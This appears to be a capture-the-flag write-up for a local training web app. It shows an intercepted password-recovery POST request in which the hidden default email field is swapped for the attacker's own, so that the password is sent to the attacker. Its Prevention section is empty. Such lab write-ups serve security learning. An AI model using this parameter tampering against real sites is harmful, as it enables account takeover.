```
in the web application we have a signin page that requires a user and password to login , i tryed the credentials droped from the htpasswd file but didnt work .
also there is a  way to recover the password using "I forgot my password link"  but apparently it doesnt ask us to define our email where to receive it or anything , then ok lets try and catch the request and see what happens.




POST /index.php?page=recover HTTP/1.1
Host: localhost:8080
Content-Length: 44
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/index.php?page=recover
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close

mail=webmaster%40borntosec.com&Submit=Submit


apparently there is a default email already in the request , lets put our email for example so that the password get sent to us , and we got the flag.
```


***Prevention***
```
```